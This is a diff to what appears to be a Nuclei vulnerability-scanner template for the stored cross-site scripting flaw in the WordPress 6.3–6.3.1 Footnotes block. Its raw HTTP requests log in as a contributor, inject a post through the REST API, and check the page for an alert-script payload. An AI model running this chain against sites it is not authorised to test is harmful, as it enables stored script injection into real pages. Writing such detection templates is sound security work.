@@ -1,11 +1,13 @@
-id: footnote-xss
+id: wp-footnote-xss
 
 info:
-  name: Contributor+ Stored XSS via Footnotes Block
+  name:  WordPress 6.3-6.3.1 Footnotes Block -  Cross-Site Scripting
   author: nqdung2002
   severity: medium
-  description: WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.
-  impact: This could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.
+  description: |
+    WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.
+  impact: |
+    This could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.
   reference:
     - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-63-631-authenticatedcontributor-cross-site-scripting-via-footnotes-block?asset_slug=wordpress
     - https://wpscan.com/vulnerability/63270b61-dddd-4cc0-a091-a04cb4f682ec/
@@ -14,26 +16,27 @@ info:
     cvss-score: 6.4
     cwe-id: CWE-79
   metadata:
-    max-request: 6
+    max-request: 4
     framework: wordpress
-  tags: wpscan,xss,wp,wordpress,footnote,sxss,post,cross-site scripting
+  tags: wpscan,xss,wp,wordpress,footnote,xss,authenticated
 
 http:
   - raw:
       - |
         POST /wp-login.php HTTP/1.1
         Host: {{Hostname}}
+        Origin: {{RootURL}}
         Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
 
-        log={{contributor}}&pwd={{password}}
-      - |
-        GET /wp-admin/ HTTP/1.1
-        Host: {{Hostname}}
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
       - |
         GET /wp-admin/post-new.php HTTP/1.1
         Host: {{Hostname}}
+
       - |
-        POST /{{route}}/{{postid}} HTTP/1.1
+        POST /?rest_route=/wp/v2/posts/{{postid}} HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/json
         X-HTTP-Method-Override: PUT
@@ -48,40 +51,35 @@ http:
           },
           "status": "pending"
         }
+
       - |
         GET /?p={{postid}} HTTP/1.1
         Host: {{Hostname}}
+
     host-redirects: true
-    max-redirects: 1
-    stop-at-first-match: true
-    payloads:
-      contributor: 
-        - "contributor"
-      password: 
-        - "123"
-      route:
-        - "?rest_route=/wp/v2/posts"
-    attack: clusterbomb
+    max-redirects: 2
 
     matchers:
       - type: dsl
         dsl:
-          - 'status_code == 200'
-          - 'contains(body_5, "<script>alert(document.domain)</script>")'
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "<script>alert(document.domain)</script>")'
+          - 'contains(header_4, "text/html")'
         condition: and
         
     extractors:
       - type: regex
         name: postid
-        part: body_3
+        part: body_2
         group: 1
-        internal: true
         regex:
           - 'post=(\d+)'
+        internal: true
+
       - type: regex
         name: nonce
-        part: body_3
+        part: body_2
         group: 1
-        internal: true
         regex:
           - 'createNonceMiddleware\(\s"(.*)\"\s\)'
+        internal: true
